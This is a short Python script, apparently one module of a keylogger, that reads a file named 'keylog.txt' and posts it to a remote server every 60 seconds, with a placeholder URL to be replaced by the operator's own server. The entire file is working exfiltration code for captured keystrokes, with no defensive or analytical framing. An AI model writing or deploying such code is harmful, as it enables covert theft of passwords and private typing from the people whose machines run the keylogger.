# upload_server.py

import requests
import time

def send_file_to_server(file_path):
    server_url = "http://127.0.0.1:5000/upload"  # Replace with your server URL
    with open(file_path, 'rb') as file:
        files = {'file': file}
        try:
            response = requests.post(server_url, files=files)
            if response.status_code == 200:
                print("File uploaded and processed successfully")
            else:
                print(f"Failed to upload file: {response.text}")
        except Exception as e:
            print(f"Error uploading file: {e}")

def start_upload_server():
    while True:
        send_file_to_server('keylog.txt')  # Upload the log file to the server
        time.sleep(60)  # Wait for 60 seconds before uploading again
